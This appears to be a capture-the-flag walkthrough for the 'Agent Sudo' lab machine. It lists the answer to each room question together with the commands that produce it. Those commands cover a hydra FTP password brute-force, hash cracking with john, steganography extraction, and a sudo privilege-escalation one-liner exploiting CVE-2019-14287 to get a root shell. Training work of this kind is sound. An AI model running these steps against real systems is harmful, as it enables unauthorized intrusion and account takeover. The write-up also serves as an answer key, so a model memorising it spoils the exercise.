# Agent Sudo


- Deploy the machine

	  no answer needed

- How many open ports?

	- `nmap <TARGET_IP>`
	- `3`

- How you redirect yourself to a secret page?

	- `user-agent`

- What is the agent name?

	- Let's try changing the user-agent.
	- `curl -A "A" -L <TARGET_IP>`. Mmmmh...
	- `curl -A "C" -L <TARGET_IP>`. Got it.
	- `chris`

- FTP password

	- `hydra -l chris -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -vV -t 4 ftp`
	- `crystal`

- steg password

	- `ftp <TARGET_IP>`
	- Enter username `chris` and password `crystal`.
	- `mget *`
	- By `ToAgentJ.txt` I can understand there is a pic that isn't a photo actually.
	- In fact, `binwalk -e cutie.png` extracts useful data.
	- `cd _cutie.png.extracted`
	- `zip2john 8702.zip > zip.hash`
	- `john zip.hash` and we get the password
	- `7z e zip.hash`, enter `Y` and the password.
	- `cat ToAgentR.txt`
	- Inserting that weird string into CyberChef (from Base64) we get `Area51`.
	- `Area51`

- Zip file password

	- `alien`

- Who is the other agent (in full name)?

	- `steghide info cute-alien.jpg`, enter `y` and the passphrase (`Area51`).
	- There is a message.txt inside
	- `steghide extract -sf cute-alien.jpg`
	- `james`

- SSH password

	- `hackerrules!`

- What is the user flag?

	- `ssh james@<TARGET_IP>` and then enter the password.
	- `cat user_flag.txt`
	- `b0**975e8******041**********13c7`

- What is the incident of the photo called?

	- Enable ssh on your machine
	- `scp Alien_autospy.jpg YOUR-USER-HERE@YOUR-IP-HERE:Alien_autospy.jpg`
	- Search that photo with Google Reverse Image.
	- `Roswell Alien Autopsy`

- CVE number for the escalation (Format: CVE-xxxx-xxxx)

	- `sudo -l`
	- `CVE-2019-14287` ([exploit-db](https://www.exploit-db.com/))

- What is the root flag?

	- `sudo -u \#$((0xffffffff)) /bin/bash`
	- `id`
	- `cat /root/root.txt`
	- `b53**2f55b57******3341**********`
	- `Deskel`



